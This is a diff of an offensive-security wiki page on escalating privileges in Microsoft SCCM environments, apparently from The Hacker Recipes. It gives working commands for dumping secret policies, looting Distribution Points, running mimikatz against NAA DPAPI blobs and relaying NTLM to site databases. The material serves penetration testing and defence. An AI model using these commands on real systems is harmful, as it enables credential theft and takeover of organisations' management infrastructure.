@@ -1,201 +1,241 @@
 ---
-authors: BlWasp, ShutdownRepo
+authors: BlWasp, ShutdownRepo, q-roland
 ---
 
 # Privilege escalation
 
 ## Theory
 
-Curently there are three different pathways for privilege escalation routes in an SCCM environment and take control over the infrastructure:
+There are currently three different pathways for privilege escalation in an SCCM environment in order to take control over the infrastructure:
+* Credential harvesting
+* Client Push account authentication coercion
+* SCCM site takeover
 
-* Credential harvesting: includes all the ways that could permit to retrieve SCCM related credentials in the environment.
-* Authentication Coercion: with a compromised machine in an Active Directory where SCCM is deployed via Client Push Accounts on the assets, it is possible to have the "Client Push Account" authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. [NTLM capture](../ntlm/capture)). The "Client Push Account" usually has local administrator rights to a lot of assets.
-* SCCM site takeover: a NTLM authentication obtained from the SCCM primary site server can be relayed to the SMS Provider or the MSSQL server in order to compromise the SCCM infrastructure.
-* SCCM site takeover from a passive site server: as describer by [Garrett Foster](https://twitter.com/garrfoster) in this [article](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43), when a passive site server is setup for high availability purpose, its machine account must be a member of the local Administrators group on the active site server. It must also be administrator on all the site system deployed in the site, including the MSSQL database
+### Credential harvesting
+
+For more details on this subject, see [this Synacktiv article](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_2).
+
+[This blogpost](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) also contains useful information on the topic.
+
+An SCCM infrastructure may contain a wide range of cleartext credentials accessible from various levels of privileges. Some credentials can be associated with privileged accounts in the domain. From a privilege escalation perspective, we are interested in secrets retrievable using an SCCM client or a low-privilege account in the domain.
+
+1. **Secret policies**: Network Access Accounts (NAAs), Task sequences and Collection variables
+
+Some policies may contain sensitive data and are tagged as **secret policies**. Only registered SCCM devices in the **approved** state may request them. By default in SCCM, two device registration endpoints are available on the Management Point (MP): `http://<MP>/ccm_system/request` and `http://<MP>/ccm_system_windowsauth/request`. The first one is unauthenticated, meaning that anyone can generate a self-signed certificate and register an arbitrary device; however, by default, devices registered through this endpoint are **not** approved, which means that they cannot request secret policies. The second endpoint is authenticated and requires credentials for a domain machine account; devices registered through this endpoint are, by default, **automatically approved**.
+> [!TIP] TIP
+> This concretely means that an attacker that has a machine account or that is able to relay one can register an approved device and dump secret policies. Also, note that it is possible to **misconfigure** SCCM in order to automatically approve any device registering through the unauthenticated registration endpoint. In that case, an unauthenticated attacker on the network could dump secret policies.
+
+Three kind of secret policies can contain secrets and/or account credentials:
+* **Network Access Accounts (NAAs)**: NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. NAA does not need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts. NAA credentials are distributed via secret policies.
+* **Task sequences**: Task sequences are automated workflows that can be deployed by administrators on client devices and that will execute a series of steps. [Various task sequence steps](https://www.mwrcybersec.com/an-inside-look-how-to-distribute-credentials-securely-in-sccm) require or give the possibility to the administrator to provide domain credentials in order to execute them. They are distributed via secret policies.
+* **Collection variables**: In SCCM, it is possible to associate variables to specific collections of devices. These variables can be used to customize deployments, scripts, or configurations for all members of the collection. They may contain credentials and are distributed via secret policies.
+
+
+2. **Distribution Points resources**
+
+Policies may reference external resources hosted on a **Distribution Point**. These resources may be applications, OS images, but also configuration files, PowerShell scripts, certificates, or other kind of file susceptible to contain sensitive technical information such as credentials.
+
+Distribution Point primarily distributes resources via SMB and HTTP. By default, valid domain credentials must be provided to access hosted resources.
+> [!TIP] TIP
+> This concretely means that an attacker with any domain account can fetch Distribution Point resources. In addition, it is possible to **misconfigure** SCCM Distribution Points to allow anonymous access to resources via HTTP.
+
+
+### Client Push account authentication coercion
+
+If SCCM is deployed via Client Push Accounts, it is possible, from a compromised SCCM client, to coerce the Client Push Account into authenticating to an arbitrary remote resource. It is then possible to retrieve NTLM authentication data in order to crack the account's password or relay the data to other services. Client Push Accounts are privileged as they are required to have local administrator rights on workstations on which they deploy the SCCM client.
+
+### SCCM site takeover
+
+Some SCCM configurations make it possible to abuse the permissions of the site server / passive site server machine accounts in order to compromise the SCCM infrastructure via relay attacks.
+
+1. **Relaying the primary site server**
+
+A site server machine account is required to be member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](index#topology)):
+> The user account that installs the site must have the following permissions:
+>
+> * Administrator on the following servers:
+>   * The site server
+>   * Each SQL Server that hosts the site database
+>   * Each instance of the SMS Provider for the site
+>   * Sysadmin on the instance of SQL Server that hosts the site database
+>
+> _(source:_ [_Microsoft.com_](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites)_)_
+
+As a result, NTLM authentication data can be obtained from an SCCM primary site server and relayed in order to obtain administrative access to the site database, or interact as a local administrator with the HTTP API on the SMS Provider. In both cases, this can lead to the full compromise of the SCCM infrastructure.
+
+2. **Relaying a passive site server**
+
+As describer by [Garrett Foster](https://twitter.com/garrfoster) in this [article](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43), when a passive site server is set up for high availability purpose, its machine account must be a member of the local Administrators group on the active site server. It must also be administrator on all the site system deployed in the site, including the MSSQL database. As a result, the same NTLM relaying attacks as described for primary site servers can be exploited in order to compromise the SCCM site database or gain privileged access to the HTTP API of the SMS Provider.
+
+
 
 ## Practice
 
 ### Credential harvesting
 
-The following SCCM components can contain credentials:
+As noted in the [Theory section](#theory), secrets can be harvested from SCCM secret policies, or Distribution Point resources.
 
-* Device Collection variables
-* TaskSequence variables
-* Network Access Accounts (NAAs)
-* Client Push Accounts
-* Application & Scripts (potentially)
+#### Secret SCCM policies
 
-Find more details about these components in [this blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) post.
-
-#### Network Access Accounts (NAAs)
-
-NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. To do this, the SCCM server sends the NAA policy to the machine, which will store the credentials encrypted by DPAPI on the disk. The credentials can be retrieved by requesting the WMI class in the CIM store in a binary file on the disk.
-
-NAA doesn't need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts.
-
-It is worth to note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.
+Only **approved SCCM devices** can fetch secret policies. It is first possible to **register a device ourselves** by providing domain machine account credentials (or exploiting automatic device approval).
 
 ::: tabs
 
 === UNIX-based
 
-From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher via DPAPI the WMI blob related to SCCM and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
+To this end, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) can be used. All secret policies associated with the default collections for the newly registered device (including NAAs, Task sequences and collection variables) will be dumped.
+
+```bash
+python3 SCCMSecrets.py policies -mp http://mecm.sccm.lab -u 'azule$' -p 'Password123!' -cn 'newdevice'
+```
+
+Note that if you do not provide machine account credentials, `SCCMSecrets.py` will use the unauthenticated registration endpoint in order to attempt exploiting automatic device approval.
+
+This attack is also possible via NTLM relay if you are able to relay the authentication data of a domain machine account. See [the following ntlmrelayx PR](https://github.com/fortra/impacket/pull/1832).
+```bash
+python3 examples/ntlmrelayx.py -t 'http://mecm.sccm.lab/ccm_system_windowsauth/request' -smb2support --sccm-policies -debug
+```
+
+Finally, this attack was first inspired by @xpn_'s work (refer to [this blogpost](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)). The tool associated with the blogpost, [sccmwtf](https://github.com/xpn/sccmwtf), is available on Github. It can be used to perform the attack, however with two limitations: it will only dump the NAA secret policy, and it might fail on recent SCCM installations since the encryption algorithm changed.
+
+The [sccmhunter](https://github.com/garrettfoster13/sccmhunter) tool also implements `sccmwtf`, but with the same limitations.
+
+
+=== Windows-based
+
+On Windows, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) can be used to register a device and dump secret policies. All secret policies associated with the default collections for the newly registered device (including NAAs, Task sequences and collection variables) will be dumped.
+
+```powershell
+.\SharpSCCM.exe get secrets -r newdevice -u chell$ -p <password>
+```
+
+:::
+
+Instead of registering a new device, it is also possible to use an already compromised SCCM device in order to dump secret policies. Note that this can also be interesting as the compromised device may be part of specific device collections associated with more task sequences or collection variables than the default collections we dumped by registering a device ourselves.
+
+::: tabs
+
+=== Unix-based
+
+In order to use a compromised SCCM device, it is first necessary to **extract the SCCM certificates** from the machine. More details on how to do this [here](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_4).
+
+With the SCCM device private key and GUID, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) can be used to impersonate the device and dump secret policies (in the example below, the `compromised_device/` folder contains the `key.pem` and `guid.txt` files).
+
+All secret policies associated with the compromised device's collections (including NAAs, Task sequences and collection variables) will be dumped.
+
+```bash
+python3 SCCMSecrets.py policies -mp http://mecm.sccm.lab --use-existing-device compromised_device/
+```
+
+
+=== Windows-based
+
+From a local administrator access on the machine of a compromised SCCM device, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) can be executed to use the local SCCM device and dump secret policies.
+
+All secret policies associated with the compromised device's collections (including NAAs, Task sequences and collection variables) will be dumped.
+
+```powershell
+.\SharpSCCM.exe get secrets
+```
+
+:::
+
+Finally, it should be mentioned that the Network Access Accounts (NAAs) credentials are stored on the disk of SCCM clients, encrypted with DPAPI. Interestingly enough, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers (see [this SpecterOps article](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)).
+
+As a result, it is possible to retrieve NAA accounts credentials **locally** on compromised devices, even when they are not included in the secret policies distributed by SCCM.
+
+::: tabs
+
+=== UNIX-based
+
+Using a local administrator account, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) can be used to fetch and decrypt NAA DPAPI blobs.
 
 ```bash
 SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@target.$DOMAIN
 ```
 
-On the other hand, it is possible, from a controlled computer account, to manually request the SCCM policy and retrieve the NAAs inside.
+=== Windows-based
 
-> [!CAUTION]
-> The tool author ([Adam Chester](https://twitter.com/_xpn_)) warns not to use this script in production environments.
-
-Step 1: Gain control over a computer account password.
-
-For this step, it is possible to create a new computer account (if permited by the domain policy), instead of compromise a domain computer.
-
-```bash
-addcomputer.py -dc-ip $DC -computer-name controlledComputer$ -computer-pass controlledPassword $DOMAIN/$USER:$PASSWORD
-```
-
-Step 2: Use `sccmwtf.py` to extract NAA secrets
-
-A controlled computer account is needed to send the authenticated request (this is why a computer account has been created previously) to retrieve the policy, but the account to spoof doesn't need to be the same.
-
-Here, `$SCCM_MP_NetBiosName` takes the value of the SCCM Management Point server NETBIOS name.
-
-```bash
-sccmwtf.py fakepc fakepc.$DOMAIN $SCCM_MP_NetBiosName "$DOMAIN\controlledComputer$" "controlledPassword"
-```
-
-Step 3: Obtain obfuscated NAA secrets
-
-The obufscated NAA secrets will be saved in a local file.
-
-```bash
-cat /tmp/naapolicy.xml
-```
-
-Values to decode are the long hexadecimal strings in the CDATA sections (`<![CDATA[String_here]`).
-
-Step 4: Decode obfuscated strings
-
-To decode username and password use `.\DeobfuscateSecretString.exe` contained in [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) or [sccmwtf](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.c)
-
-````powershell
-policysecretdecrypt.exe $HEX_STRING
-````
-
-Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/_xpn_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.
-
-```bash
-#Create a new computer account and request the policies
-python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
-
-#To use an already controlled computer account
-python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -cn $COMPUTER_NAME -cp $COMPUTER_PASSWORD -dc-ip $DC_IP
-```
-
-
-=== From Windows
-
-From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) or a PowerShell command, can be used with, administrative rights, to extract the NAA credentials locally.
+With administrative access to a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [Mimikatz](https://github.com/gentilkiwi/mimikatz) or native PowerShell can be used to extract the NAA credentials locally.
 
 ```powershell
-# Locally From WMI
-Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
+# SharpSCCM - from disk
+SharpSCCM.exe local secrets disk
 
-# Extracting from CIM store
-SharpSCCM.exe local secretes disk
+# SharpSCCM - from WMI
+SharpSCCM.exe local secrets wmi
 
-# Extracting from WMI
-SharpSCCM.exe local secretes wmi
-
-# Using SharpDPAPI
+# SharpDPAPI
 SharpDPAPI.exe SCCM
 
-# Using mimikatz
+# Mimikatz
 mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # dpapi::sccm
+
+# Native Powershell
+Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
 ```
-
-SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.
-
-```powershell
-SharpSCCM.exe get secretes
-```
-
 :::
 
 
-#### TaskSequence variables
+#### Distribution Point resources
 
-TaskSequence are steps that can be configured by an administrator to perform specific actions, for example "Sequence for adding a machine to the domain". Think of it as a script that runs. These TaskSequences can contain variables that can contain credentials. These sequences can use device collection variables (presented in the next section) as conditions.
+By default, any authenticated user can retrieve Distribution Point resources which may contain secrets.
+
+Resources can be downloaded through the SMB or HTTP protocols.
+
+Note that if anonymous access was configured on a Distribution Point, only the HTTP protocol can be used to download files without any credentials.
 
 ::: tabs
 
-=== UNIX-based
+=== HTTP
 
-_At the time of writing (February 2024), no solution exists to perform this attack from a UNIX-like machine._
+Regarding the HTTP protocol, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) can be used to index and download files from Distribution Points.
 
-=== From Windows
+Not providing any credentials will attempt to exploit anonymous access on the Distribution Point.
 
-From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the TaskSequence variables locally.
+```bash
+# Attempts to exploit anonymous access to index and download files
+python3 SCCMSecrets files -dp http://mecm.sccm.lab
 
-```powershell
-# Locally from WMI 
+# Downloads files with specific extensions 
+python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -H 'F7EB9C06FAFAA23C4BCF22BA6781C1E2' --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'
 
-Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
-
-# Extracting from CIM store
-SharpSCCM.exe local secrets -m disk
-
-# Extracting from WMI
-SharpSCCM.exe local secrets -m wmi
+# Having indexed files first, downloads specific files from the Distribution Point
+python3 SCCMSecrets.py files -dp http://mecm.sccm.lab -u 'dave' -p 'dragon' --urls to_download.lst
 ```
 
-SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.
+If anonymous access is enabled on the Distribution Point, [sccm-http-looter](https://github.com/badsectorlabs/sccm-http-looter) can also be used. It may be faster as it is written in Golang.
+
+```bash
+./sccm-http-looter -server 10.10.10.10
+```
+
+This attack is also possible via NTLM relay if you are able to relay the authentication data of a domain account. See [the following ntlmrelayx PR](https://github.com/fortra/impacket/pull/1832).
+```bash
+python3 examples/ntlmrelayx.py -t 'http://mecm.sccm.lab/sms_dp_smspkg$/Datalib' -smb2support --sccm-dp -debug
+```
+
+=== SMB
+
+Regarding the SMB protocol, [CMLoot](https://github.com/1njected/CMLoot) was the original implementation of the attack in Powershell.
 
 ```powershell
-SharpSCCM.exe get secrets
+# Index available files
+Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
+
+# Download a single file
+Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
+
+# Download all files with a specific extension
+Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension ps1
 ```
+
+Note that a python implementation is now available, see [cmloot.py](https://github.com/shelltrail/cmloot).
 
 :::
-
-
-#### Device Collection variables
-
-Devices enrolled in an SCCM environment can be grouped by collection. These exist by default, but administrators can create custom collections (for example "Server 2012 devices"), and add variables for these collections that will be used, for example, during application deployement to check some conditions. These variables may very well contain credentials and be found locally on the clients.
-
-::: tabs
-
-=== UNIX-based
-
-_At the time of writing (February 2024), no solution exists to perform this attack from a UNIX-like machine._
-
-
-=== From Windows
-
-From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the collection variables locally.
-
-```powershell
-# Locally from WMI 
-
-Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
-
-# Locally from CIM store
-SharpSCCM.exe local secrets -m disk
-
-# Locally from WMI
-SharpSCCM.exe local secrets -m wmi
-```
-
-:::
-
-
-![](<./assets/SharpSCCM-get-secrets-command.png>)
 
 
 ### Authentication Coercion via Client Push Installation
@@ -249,20 +289,6 @@ If you run the above SharpSCCM command with the `--as-admin` parameter (since yo
 
 ### SCCM Site Takeover
 
-The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](index#topology)).
-
-> The user account that installs the site must have the following permissions:
->
-> * Administrator on the following servers:
-> * The site server
-> * Each SQL Server that hosts the site database
-> * Each instance of the SMS Provider for the site
-> * Sysadmin on the instance of SQL Server that hosts the site database
->
-> _(source:_ [_Microsoft.com_](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites)_)_
-
-This means that it is possible to obtain administrative access on the site database server, or interact as a local administrator with the HTTP API on the SMS Provider, by relaying a NTLM authentication coming from the primary site server, for example by coercing an automatic client push installation from it, and granting full access on the SCCM site to a controlled user.
-
 > [!TIP]
 > For more details about how these attacks work, refer to the article "[SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem) for the database attack, and "[Site Takeover via SCCM’s AdminService API](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)" by [Garrett Foster](https://twitter.com/garrfoster) for the HTTP one.
 
@@ -273,18 +299,18 @@ This means that it is possible to obtain administrative access on the site datab
 > 
 > * automatic site assignment and automatic site-wide [client push installation](index#client-push-installation-1) are enabled
 > * fallback to NTLM authentication is enabled (default)
-> * the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) not installed (it prevents the client push installation account to perform an NTLM connection to a client)
+> * the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) is not installed (it prevents the client push installation account to perform an NTLM connection to a client)
 > * PKI certificates are not required for client authentication (default)
 > * either:
 > 
-> * MSSQL is reachable on the site database server
+>   * MSSQL is reachable on the site database server
 > 
 > OR
 > 
-> * SMB is reachable and SMB signing isn’t required on the site database server
-> * knowing the three-character site code for the SCCM site is required (step 3 below)
-> * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
-> * knowing the NetBIOS name, FQDN, or IP address of the site database server is required
+>   * SMB is reachable and SMB signing isn’t required on the site database server
+>   * knowing the three-character site code for the SCCM site is required (step 3 below)
+>   * knowing the NetBIOS name, FQDN, or IP address of a site management point is required
+>   * knowing the NetBIOS name, FQDN, or IP address of the site database server is required
 > 
 > The first four requirements above apply to the [client push installation coercion technique](index#client-push-installation). But without them, a regular coercion technique could still be used (petitpotam, printerbug, etc.).
 
@@ -353,14 +379,14 @@ ntlmrelayx.py -t "siteDatabase.domain.local" -smb2support -socks
 
 === Windows
 
-From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it doesn't feature the same SOCKS functionality, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
+From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same SOCKS functionality, needed in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
 
 :::
 
 
 Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../ntlm/relay).
 
-3. Authentication coercion
+##### Step 3: coerce authentication
 
 The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc.).
 
@@ -454,7 +480,7 @@ ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -sm
 
 === Windows
 
-From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it doesn't feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
+From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
 
 :::
 
@@ -462,7 +488,7 @@ From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh
 Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [NTLM Relay](../ntlm/relay).
 
 
-##### Step 2: authentication coercion
+##### Step 2: Authentication coercion
 
 The primary site server's authentication can be coerced via automatic client push installation targeting the relay server with [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#). For more information, see the corresponding article "[Coercing NTLM authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)" by [Chris Thompson](https://mobile.twitter.com/_mayyhem). Alternatively, the server's authentication could be coerced with other, more common, coercion techniques ([PrinterBug](../print-spooler-service/printerbug), [PetitPotam](../mitm-and-coerced-authentications/ms-efsr), [ShadowCoerce](../mitm-and-coerced-authentications/ms-fsrvp), [DFSCoerce](../mitm-and-coerced-authentications/ms-dfsnm), etc.).
 
@@ -519,7 +545,7 @@ ntlmrelayx.py -t $ACTIVE_SERVER.$DOMAIN -smb2support -socks
 
 === Windows
 
-From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it doesn't feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
+From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) can be used as an alternative to [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), however it does not feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.
 
 :::
 
@@ -561,6 +587,8 @@ Post exploitation via SCCM can now be performed on the network.
 ## Resources
 
 [https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/)
+
+[https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)
 
 [https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts](https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts)
 
